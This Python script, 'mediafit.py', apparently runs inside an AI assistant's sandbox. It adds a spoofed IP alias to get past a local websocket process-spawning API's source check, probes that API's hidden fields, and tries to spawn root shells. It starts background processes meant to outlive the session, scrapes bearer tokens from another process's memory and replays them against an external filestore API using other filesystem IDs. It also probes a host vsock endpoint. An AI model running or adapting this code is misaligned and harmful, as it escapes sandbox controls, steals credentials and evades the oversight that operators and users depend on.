#!/usr/bin/env python3
# mediafit.py v6.9 -- FIELD ORACLE + SPAWN + PERSISTENCE + TOKENS
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER, NONCE = "6.9", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
WSID = "wrkspc_017QU2cVGQTZXEQ6jauRtpN6"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=15):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

# ---------------- ws ----------------
def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=3.0, quiet=False):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        t = d.decode(errors="replace")
        if op != 2 and not quiet:
            w("        << %s" % t[:500].replace("\n", " | "))
        elif op == 2 and not quiet:
            w("        << BIN(%d) %s" % (len(d), t[:500].replace("\n", " | ")))
        out.append(t)
    return out

def ws_try(src, msg, label, dur=2.5, quiet=False):
    s = ws_hs(src)
    if not s: w("  [%s] hs fail" % label); return None
    try:
        ws_send(s, json.dumps(msg)); return ws_read(s, dur, quiet)
    finally:
        try: s.close()
        except Exception: pass

def spec(pid, cmdline, mem=268435456, extra=None):
    cr = {"cmd": "/bin/sh", "args": ["-c", cmdline], "env_vars": {}, "cwd": "/",
          "rows": 24, "cols": 80, "timeout": 30, "clear_env": False, "uid": 0, "gid": 0,
          "allow_process_id_reuse": True, "reattachable": True}
    if mem is not None: cr["memory_limit_bytes"] = mem
    if extra: cr.update(extra)
    return {"process_id": pid, "create_req": cr}

def field_at(js, col):
    seg = js[:max(0, col-1)]
    ms = re.findall(r'"([A-Za-z_0-9]+)"\s*:', seg)
    return ms[-1] if ms else None

# ---------------- ip ----------------
SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00", socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

# ===================== RUN =====================
def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. FACTS")
    w("kernel: " + sh("uname -a").strip())
    w("persist logs from previous runs:")
    for f in ("/tmp/mf_api_persist.log", "/tmp/mf_nohup_persist.log"):
        w("  %s: %s" % (f, sh("wc -l %s 2>/dev/null; tail -2 %s 2>/dev/null" % (f, f)).replace("\n", " | ") or "(absent)"))

    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
    w("  bypass OK")

    sec("A. FIELD ORACLE (types) -- find real field names")
    INNER = ["cmd","command","program","executable","path","binary","exec","entrypoint","argv",
             "args","arg","shell","cmdline","root","chroot","cwd","working_dir","workdir","dir",
             "user","uid","gid","group","tty","pty","rows","cols","timeout","memory_limit_bytes",
             "clear_env","allow_process_id_reuse","reattachable","env_vars","env","stdin","stdout",
             "stderr","name","label","container_name","cpus","nice"]
    for passval, tag in ((12345, "int"), (True, "bool"), ("ZZZ", "str")):
        remaining = list(INNER)
        for it in range(25):
            sp = spec("mf_orc", "true")
            for c in remaining: sp["create_req"][c] = passval
            payload = json.dumps(sp)
            r = ws_try(ALIAS, sp, "orc-%s" % tag, 2.2, quiet=True)
            j = " ".join(r or [])
            if "invalid type" not in j:
                w("  pass=%-4s -> no further type conflicts (%d left)" % (tag, len(remaining))); break
            col = re.search(r"column (\d+)", j)
            exp = re.search(r"expected ([a-zA-Z0-9_ ]+)", j)
            f = field_at(payload, int(col.group(1))) if col else None
            if not f: w("  pass=%s could not map column" % tag); break
            w("  REAL FIELD: %-22s expects %s" % (f, exp.group(1) if exp else "?"))
            if f in remaining: remaining.remove(f)
        w("  --")
    w("  outer-level probe:")
    for c in ("process_id","create_req","expected_container_name","reattach","detach","resume","fsid"):
        sp = spec("mf_o", "true"); sp[c] = 12345
        payload = json.dumps(sp)
        r = ws_try(ALIAS, sp, "outer-%s" % c, 2.2, quiet=True)
        j = " ".join(r or [])
        if "invalid type" in j:
            exp = re.search(r"expected ([a-zA-Z0-9_ ]+)", j)
            w("    OUTER REAL: %-24s expects %s" % (c, exp.group(1) if exp else "?"))

    sec("B. SPAWN ATTEMPT with discovered knowledge")
    for cmd in ("/bin/sh", "/usr/bin/env", "/bin/ls", "/bin/dash", "/usr/bin/python3"):
        for cwd in ("/", "/tmp", "/root", "/home/claude"):
            r = ws_try(ALIAS, spec("mf_" + re.sub(r"\W", "_", cmd+cwd), "echo SPAWN_OK; id; pwd",
                       extra={"cmd": cmd, "cwd": cwd}), "%s@%s" % (cmd, cwd), 2.5, quiet=True)
            j = " ".join(r or [])
            ok = "FailedToStart" not in j and ("ProcessCreated" in j or "ExpectStd" in j or "SPAWN_OK" in j)
            w("  %-18s cwd=%-12s %s" % (cmd, cwd, "*** WORKING ***" if ok else j[:90]))
            if ok:
                w("      full: " + j[:400])
                break
        else: continue
        break
    w("  -- extra field guesses if still failing --")
    for extra in ({"root": "/"}, {"chroot": "/"}, {"env": {}}, {"pty": True}, {"tty": True},
                  {"working_dir": "/"}, {"program": "/bin/sh"}, {"command": "/bin/sh"}):
        r = ws_try(ALIAS, spec("mf_g", "echo GUESS_OK", extra=extra), "g-%s" % list(extra)[0], 2.2, quiet=True)
        j = " ".join(r or [])
        w("    +%-18s %s" % (json.dumps(extra), j[:110]))

    sec("C. PERSISTENCE TEST (API-spawned vs nohup)")
    sh("rm -f /tmp/mf_api_persist.log /tmp/mf_nohup_persist.log")
    loop = "while true; do date +%%s >> %s; sleep 2; done"
    ws_try(ALIAS, spec("mf_persist", loop % "/tmp/mf_api_persist.log", 268435456,
                       {"timeout": None}), "persist-create", 3.0)
    sh("nohup sh -c '%s' >/dev/null 2>&1 &" % (loop % "/tmp/mf_nohup_persist.log"))
    time.sleep(3)
    w("  api log:   " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null").strip())
    w("  nohup log: " + sh("wc -l /tmp/mf_nohup_persist.log 2>/dev/null").strip())
    w("  (re-run the script to see which survives between commands)")

    sec("D. TOKENS: sig-truncate + filesystem_id")
    cands = set()
    try:
        maps = open("/proc/57/maps").read().splitlines()
        fh = open("/proc/57/mem", "rb", buffering=0)
        total, buf = 0, b""
        for ln in maps:
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception as e:
        w("  mem err " + repr(e)); buf = b""
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands.add(mm.group(0).decode())
    def b64d(x):
        x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
    uniq = {}
    for t in cands:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 80: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        key = tuple(pl.get("allowed_roots") or [])
        if key not in uniq: uniq[key] = (p[0], p[1], p[2][:86], pl)
    w("  unique roots=%d" % len(uniq))
    import urllib.request as ur
    def call(path, tok, fsid=None, method="listDirectory"):
        body = {"path": path}
        if fsid: body["filesystem_id"] = fsid
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method,
                            data=json.dumps(body).encode(),
                            headers={"Content-Type": "application/json",
                                     "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + tok})
            with ur.urlopen(rq, timeout=8) as r: return r.status, r.read().decode(errors="replace")
        except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
        except Exception as e: return "ERR", repr(e)
    for roots, (h, pl_, sg, pl) in uniq.items():
        tok = ".".join([h, pl_, sg])
        root = (roots or ["/"])[0]
        for fsid in (None, FSID, WSID, "claude_chat_000000000000000000000000"):
            c, b = call(root, tok, fsid)
            tag = "fsid=%s" % (fsid[:20] if fsid else "omitted")
            w("  root=%-14s %-34s -> %-5s %s" % (root, tag, c, b[:150]))
            if c == 200:
                w("      *** VALID TOKEN root=%s readonly=%s" % (root, pl.get("readonly")))
                break
        if c == 200:
            for m in ("statFile","getFileUrl","readFile","listFilesystems","reassignFilesystem"):
                c2, b2 = call(root, tok, FSID, m)
                w("      %-22s -> %-5s %s" % (m, c2, b2[:130]))

    sec("E. HOST OTLP framing")
    for variant in ("plain", "split", "keepalive"):
        try:
            s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(9.0)
            s.connect((2, 5005))
            body = b"\x0a\x00"
            hdr = "POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nContent-Type: application/x-protobuf\r\nContent-Length: %d\r\n" % len(body)
            if variant != "keepalive": hdr += "Connection: close\r\n"
            hdr += "\r\n"
            if variant == "split":
                s.sendall(hdr.encode()); time.sleep(0.15); s.sendall(body)
            else:
                s.sendall(hdr.encode()+body)
            d = b""
            try:
                while len(d) < 4096:
                    c = s.recv(2048)
                    if not c: break
                    d += c
            except socket.timeout: pass
            s.close()
            w("  %-10s -> %s" % (variant, d[:170].decode(errors="replace").replace("\r\n", " | ") or "(empty)"))
        except Exception as e:
            w("  %-10s ERR %r" % (variant, e))

    sec("VERDICT")
    w("  bypass ............ OK")
    w("  tokens valid ...... see D")
    flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)